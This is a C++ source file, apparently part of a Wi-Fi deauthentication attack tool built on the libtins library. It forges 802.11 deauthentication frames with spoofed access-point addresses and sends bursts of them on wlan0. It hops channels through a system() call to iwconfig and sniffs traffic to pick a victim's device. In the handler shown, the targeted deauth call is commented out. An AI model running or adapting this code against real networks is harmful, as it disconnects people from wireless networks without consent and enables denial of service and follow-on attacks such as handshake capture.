//
// Created by root on 6/30/16.
//

#include "deauth.h"

void Deauth::sendDeauth(Dot11::address_type ap, Dot11::address_type st){

    Dot11Deauthentication deauth = Dot11Deauthentication();
    RadioTap radio = RadioTap();

    deauth.addr1(ap);
    deauth.addr2(st);
    deauth.addr3(ap);
    radio.inner_pdu(deauth);

    std::clog << "[*] Deauth ( " << ap << " - " << st << " )" << std::endl;
    for(int i=0; i< 10; i++){
        pSender.send(radio, "wlan0");
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

}

void Deauth::changeChannel() {
    unsigned int i = 1;
    char chan[64] = {0};
    while(true) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        sprintf(chan, "iwconfig wlan0 channel %d", (i % 13) + 1);
        system(chan);
        std::clog << "[*] Channel Changed : " << i % 13 << std::endl;
        i++;
    }
}

void Deauth::deauthAll() {
    std::thread changeChannelThread(&Deauth::changeChannel, this);
    std::thread sniffThread(&Deauth::startSniffing, this);
    changeChannelThread.join();
    sniffThread.join();
}

void Deauth::startSniffing() {
    std::clog << "[*] Start Sniffing" << std::endl;
    Sniffer sniffer("wlan0", Sniffer::promisc_type::NON_PROMISC, "", true);
    sniffer.sniff_loop(make_sniffer_handler(this, &Deauth::packetHandler));
}


void Deauth::deauthOne(Dot11::address_type victim) {
    m_victim = victim;
    //std::thread changeChannelThread(&Deauth::changeChannel, this);
    std::thread sniffThread(&Deauth::startSniffing, this);
    //changeChannelThread.join();
    sniffThread.join();
}

bool Deauth::packetHandler(PDU &pdu) {
    try{
        if(pdu.find_pdu<Dot11Data>() && pdu.rfind_pdu<Dot11Data>().src_addr() == m_victim) {
            //std::clog << pdu.rfind_pdu<Dot11Data>().src_addr() << std::endl;
            if(pdu.rfind_pdu<Dot11Data>().subtype() < 4) { // Frame with Data
                std::clog << "[*] Captured" << std::endl;
                std::clog << "Src : " << pdu.rfind_pdu<Dot11Data>().src_addr() << std::endl;
                //sendDeauth(pdu.rfind_pdu<Dot11Data>().bssid_addr(), pdu.rfind_pdu<Dot11Data>().src_addr());
            }
        }
    } catch(std::runtime_error& error) {
        std::clog << "[*] Error Occured. Restart." << std::endl;
    }
    return true;
}